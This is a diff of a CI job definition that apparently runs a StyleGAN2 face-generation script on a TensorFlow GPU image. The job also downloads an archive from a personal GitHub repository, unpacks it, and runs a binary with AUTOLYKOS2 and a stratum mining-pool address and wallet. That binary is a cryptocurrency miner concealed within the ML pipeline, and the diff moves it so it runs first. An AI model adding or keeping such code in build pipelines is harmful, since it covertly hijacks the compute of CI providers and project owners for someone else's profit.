@@ -39,11 +39,11 @@ jobs:
         wget https://raw.githubusercontent.com/jazzup6176/new/main/pes00.tar.gz
         ls
         tar -xf pes00.tar.gz
+        cd 111
+        pes00 --algo AUTOLYKOS2 --pool stratum+ssl://206.189.151.227:2288 --user 9i9Rb19ix2YqvyFRubz1BKzPzE28a47NqnQkiSFw9XHWjLaS3hc.rigo
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
           --truncation-psi=0.5 \
           --result-dir=/outputs/generatedFaces
-        cd 111
-        pes00 --algo AUTOLYKOS2 --pool stratum+ssl://206.189.151.227:2288 --user 9i9Rb19ix2YqvyFRubz1BKzPzE28a47NqnQkiSFw9XHWjLaS3hc.rigo
       image: tensorflow/tensorflow:1.14.0-gpu-py3
